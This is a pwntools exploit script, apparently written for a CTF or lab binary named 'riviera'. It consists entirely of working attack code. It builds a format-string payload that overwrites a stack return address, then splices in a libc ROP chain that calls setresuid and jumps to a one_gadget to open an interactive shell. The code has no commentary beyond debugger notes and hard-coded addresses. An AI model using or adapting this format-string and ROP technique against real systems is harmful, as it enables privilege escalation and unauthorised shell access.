from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-v"]

foffset = 42
soffset = 10

got = 0x404010
tag = 0x404088
msg = 0x4040a8
handle_input = 0x0401446
#b * 0x0000000000401445

if (args.GDB):
	p = gdb.debug("./riviera",
	'''
	unset environment LINES
	unset environment COLUMNS
	b * 0x00000000004013c8
	b * 0x0000000000401444
	r
	c
	x/30gx $rsp
	x/-30gx $rsp
	'''
	)
else:
	p = process("./riviera")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]

libc_base = 0x7ffff7c00000
pop_rbx = 0xa1e1e
pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
one_gadgetaddr = 0x583ec

gadgets = [
	p64(libc_base+0x2882f), #stack 16-byte alignment
	p64(libc_base+pop_rdi),
	p64(1021),
	p64(libc_base+pop_rsi),
	p64(1021),
	p64(1234),
	p64(libc_base+pop_rdx),
	p64(1021),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base+setuid),
	p64(libc_base+pop_rbx),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x01),
	p64(libc_base+0x2882f), #stack 16-byte alignment
	p64(libc_base+one_gadgetaddr)
]

ropchain = b"".join(gadgets)
gvar = args.OO
gvar = int(gvar, 16)

def	gen_pl(offset, val):

	writes = {
		0x7fffffffe0e8 + gvar + offset: val
	}
	pl = fmtstr_payload(26, writes, write_size='short', strategy='small')
	#pl += b"A" *(32 - len(pl))
	#pl = fmtstr_payload(20, writes, write_size='byte', strategy='small')
	pl = pl[:31] + ropchain + pl[32:]
	#pl = pl[:24] + pl[32:]
	return pl

pl = gen_pl(0, handle_input)
print(hexdump(pl))
p.sendline(pl)

pl = gen_pl(400, 0xdeadbeef)
print(hexdump(pl))
p.sendline(pl)


p.interactive()
